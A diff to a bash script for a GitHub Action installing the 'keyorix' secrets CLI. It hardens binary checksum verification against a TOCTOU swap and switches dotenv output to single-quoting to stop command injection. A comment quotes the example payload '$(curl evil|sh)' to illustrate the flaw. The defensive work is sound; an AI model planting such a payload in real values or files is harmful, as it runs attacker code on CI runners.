@@ -102,29 +102,62 @@ install_cli() {
       exit 1
     fi
 
-    existing="$(command -v keyorix 2>/dev/null || true)"
-    if [[ -n "$existing" ]]; then
-      if actual="$(sha256_of "$existing" 2>/dev/null)" && [[ -n "$actual" ]] && [[ "$actual" = "$expected" ]]; then
-        echo "Using existing keyorix at ${existing} (checksum verified against ${VERSION})"
-        KEYORIX_BIN="$existing"
-        "$KEYORIX_BIN" --version
-        return
-      fi
-      echo "warning: keyorix already on PATH does not match ${VERSION}'s published checksum; ignoring it and installing a fresh, verified copy" >&2
-    fi
-
     # A fresh, non-predictable directory per run (mirroring install.sh's own
     # `mktemp -d`, not a fixed, guessable path as this used previously)
     # closes off a symlink/TOCTOU race where another process on a shared
     # runner pre-creates or swaps the path between our download, checksum
     # check, chmod, and mv below. Cleaned up on any exit path via the trap.
+    # Created BEFORE the existing-on-PATH check below (not just before the
+    # download further down) because that check needs a private copy target
+    # too — see the comment there.
     #
     # An explicit template under $TMPDIR (rather than a bare `mktemp -d`) so
     # this respects a caller-set $TMPDIR instead of some implementations'
     # fixed OS temp dir fallback.
     tmp_dir="$(mktemp -d "${TMPDIR:-/tmp}/keyorix-cli.XXXXXX")"
-    trap 'rm -rf "$tmp_dir"' EXIT
+    # The path is interpolated into the trap command NOW, at registration
+    # time (rather than left as a `$tmp_dir` reference to be evaluated when
+    # the trap fires) because `tmp_dir` is a `local` of this function: the
+    # existing-on-PATH branch below can `return` from install_cli well
+    # before the script actually exits, which unsets the local — a deferred
+    # `"$tmp_dir"` reference would then fail with "unbound variable" under
+    # `set -u` when the EXIT trap finally runs. Baking in the literal path
+    # avoids depending on the variable still being in scope at that point.
+    # Expanding $tmp_dir NOW (not when the trap fires) is the point of this
+    # line, see above — so SC2064 doesn't apply here.
+    # shellcheck disable=SC2064
+    trap "rm -rf '${tmp_dir}'" EXIT
     tmp_bin="${tmp_dir}/keyorix"
+
+    existing="$(command -v keyorix 2>/dev/null || true)"
+    if [[ -n "$existing" ]]; then
+      # Checksum-verifying $existing here and then trusting that same PATH
+      # entry for every LATER invocation of $KEYORIX_BIN (well after
+      # install_cli returns, e.g. the `secret export` call much further down
+      # this script) leaves a TOCTOU window: a compromised runner image, a
+      # poisoned PATH, or a self-hosted runner shared with other jobs could
+      # swap the file (or repoint a symlink) at that path between this check
+      # and the later use, defeating the verification entirely (adversarial-
+      # review integrations-github-action.json#3). Close the window by
+      # copying $existing into our own private, non-attacker-writable
+      # $tmp_dir FIRST, hashing and using ONLY that copy from here on —
+      # rather than hashing $existing and continuing to trust the shared
+      # path afterward. Copying before hashing (not hashing $existing and
+      # copying it afterward) matters too: the bytes that get verified must
+      # be exactly the bytes that get used, not two separate reads of a path
+      # someone else could still be racing.
+      if cp "$existing" "$tmp_bin" 2>/dev/null \
+        && chmod +x "$tmp_bin" \
+        && actual="$(sha256_of "$tmp_bin" 2>/dev/null)" \
+        && [[ -n "$actual" ]] \
+        && [[ "$actual" = "$expected" ]]; then
+        echo "Using existing keyorix at ${existing} (checksum verified against ${VERSION}, copied to a private location for the rest of this run)"
+        KEYORIX_BIN="$tmp_bin"
+        "$KEYORIX_BIN" --version
+        return
+      fi
+      echo "warning: keyorix already on PATH does not match ${VERSION}'s published checksum; ignoring it and installing a fresh, verified copy" >&2
+    fi
 
     echo "Downloading keyorix ${VERSION} (${os}/${arch})..."
     curl --proto '=https' --tlsv1.2 -fsSL "$url" -o "$tmp_bin" # NOSONAR -- bash:S6506 false positive: --proto '=https' --tlsv1.2 enforces HTTPS; redirect-following is required for GitHub release CDN
@@ -303,11 +336,30 @@ inject_env() {
 # while writing values from a SECOND, different fetch would let a changed
 # value land in the file without ever being registered via mask_value, so a
 # later step that cats/sources the file would print it in the clear in the
-# job log. Quoting mirrors internal/cli/secret/export.go's writeDotenv so
-# the file matches what `keyorix secret export --format dotenv` itself
-# would have produced from this same data.
+# job log.
+#
+# Quoting strategy: this action's own docs/CI_CD.md documents `set -a && .
+# ./keyorix.env && set +a` as the recommended way to consume this exact file
+# format for the sibling GitLab CI/CircleCI examples — sourcing it with a
+# shell is a real, documented consumption path, not a hypothetical misuse. A
+# value is left UNQUOTED only when it consists ENTIRELY of a small
+# allowlisted "plainly safe" charset (alnum plus `_.,:/@+-`); ANY other
+# value — one containing a character this function used to individually
+# denylist, or any other character it hadn't anticipated — is wrapped in
+# SINGLE quotes, with only the single-quote character itself escaped via the
+# standard close-escape-reopen idiom ('\''). Single quotes are the only
+# POSIX-shell quoting form that suppresses ALL expansion (command
+# substitution `$(...)`/backtick, parameter/arithmetic expansion, globbing,
+# tilde expansion) inside the value. A previous revision used DOUBLE quotes
+# here, which do NOT suppress `$(...)`/backtick command substitution — a
+# secret value containing e.g. `$(curl evil|sh)` survived into the file
+# unneutralized and would execute if the file was later sourced
+# (adversarial-review integrations-github-action.json#2). This intentionally
+# diverges from internal/cli/secret/export.go's writeDotenv, which still
+# double-quotes and has the same unfixed gap — see that finding for why this
+# file, specifically, treats sourcing as a realistic threat model.
 write_output_file() {
-  local json="$1" file="$2" key val escaped
+  local json="$1" file="$2" key val escaped sq="'"
 
   while IFS= read -r key; do
     [[ -n "$key" ]] || continue
@@ -327,12 +379,11 @@ write_output_file() {
       while IFS= read -r key; do
         [[ -n "$key" ]] || continue
         val="$(printf '%s' "$json" | jq -r --arg k "$key" '.[$k]')"
-        if [[ "$val" == *[[:space:]]* || "$val" == *"\""* || "$val" == *"'"* || "$val" == *"="* || "$val" == *"\\"* ]]; then
-          escaped="${val//\\/\\\\}"
-          escaped="${escaped//\"/\\\"}"
-          printf '%s="%s"\n' "$key" "$escaped"
-        else
+        if [[ "$val" =~ ^[A-Za-z0-9_.,:/@+-]*$ ]]; then
           printf '%s=%s\n' "$key" "$val"
+        else
+          escaped="${val//"$sq"/$sq\\$sq$sq}"
+          printf "%s='%s'\n" "$key" "$escaped"
         fi
       done < <(printf '%s' "$json" | jq -r 'keys[]')
     } >"$file"
